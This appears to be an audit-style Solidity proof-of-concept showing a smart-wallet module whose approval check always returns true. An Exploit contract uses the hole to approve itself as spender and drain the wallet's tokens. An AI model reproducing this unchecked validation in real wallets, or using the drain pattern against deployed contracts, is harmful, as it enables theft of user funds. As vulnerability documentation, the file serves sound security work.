// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract WalletToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "balance");
        require(allowance[from][msg.sender] >= amount, "allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CredibleAccountModule {
    function validateApproval(address /*spender*/, uint256 /*amount*/) external pure returns (bool) {
        // @> VULN: approve calls are accepted without requiring the module as spender.
        return true;
    }
}

contract SmartWallet {
    function executeApprove(CredibleAccountModule module, WalletToken token, address spender, uint256 amount)
        external
    {
        require(module.validateApproval(spender, amount), "session call rejected");
        token.approve(spender, amount);
    }
}

contract Exploit {
    WalletToken public token;
    CredibleAccountModule public module;
    SmartWallet public wallet;
    uint256 public drained;

    constructor() {
        token = new WalletToken();
        module = new CredibleAccountModule();
        wallet = new SmartWallet();
    }

    function run() external {
        token.mint(address(wallet), 1_000);
        // A session key is allowed to submit an arbitrary spender for approve.
        wallet.executeApprove(module, token, address(this), 1_000);
        token.transferFrom(address(wallet), address(this), 1_000);
        drained = token.balanceOf(address(this));
        require(drained == 1_000, "wallet was not drained");
    }
}
